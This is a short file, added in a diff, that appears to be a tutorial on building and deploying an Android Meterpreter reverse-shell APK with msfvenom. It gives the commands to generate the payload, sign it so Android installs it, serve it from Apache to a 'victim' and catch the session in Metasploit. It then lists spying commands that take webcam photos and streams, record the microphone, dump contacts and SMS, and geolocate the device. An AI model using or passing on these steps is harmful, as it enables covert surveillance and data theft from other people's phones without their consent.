@@ -1,0 +1,61 @@
+				MSFVenom Demo and commands
+				Siddharth.K
+				Anonymous BMSCE
+Watch the video here: https://www.youtube.com/watch?v=3CWRbaCJ5bE
+
+ifconfig          "to get LHOST ip"
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=yourhostip LPORT=4444 R > /root/Desktop/yourapkname.apk
+"msfvenom exploit, android/meterpreter/reverse_tcp payload, LPORT exploit port, R Raw data file , Location"
+
+SignApk Command:	"To avoid android from blocking install of the payload apk by signing it with a certificate key" 
+Copy your apk file to the SignApk folder and change directory to the folder 
+ 
+In terminal type:
+java -jar signapk.jar certificate.pem key.pk8 your-app.apk your-app-signed.apk
+
+Upload in localhost webserver
+ 
+In terminal type:
+1."service apache2 start"
+2.Copy the signed apk file and paste in var/www/html/
+  Dont forget to delete the contents of the html folder, replace the html file with your signed apk
+
+Download and install the file in your Victims device by typing in the LHOST ip in the browser
+
+Run metasploit framework
+In terminal:
+1.msfconsole
+2. use multi/handler  " enables handling of multiple victims from the same session"
+3.set PAYLOAD android/meterpreter/reverse_tcp "initializing all the values"
+4.set LHOST [YOUR LHOST IP]
+5.set LPORT 4444
+6.exploit
+
+Open the app and wait for the meterpreter session.
+You should be able to successfully associate with the victim device.
+
+Type in help and explore through the various commands and enjoy.
+meterpreter > help
+
+A few of them are -
+
+View running processes :
+
+meterpreter > ps
+ 
+Take photos using the devices cameras:
+meterpreter > webcam_list
+meterpreter > webcam_snap
+meterpreter > webcam_snap -I 2
+ 
+Record sound with the microphone:
+meterpreter > record_mic 5
+ 
+Viewing a video stream from the devices camera:
+meterpreter > webcam_stream -I 2
+ 
+Other commands
+meterpreter > dump_contacts
+meterpreter > dump_sms
+meterpreter > geolocate
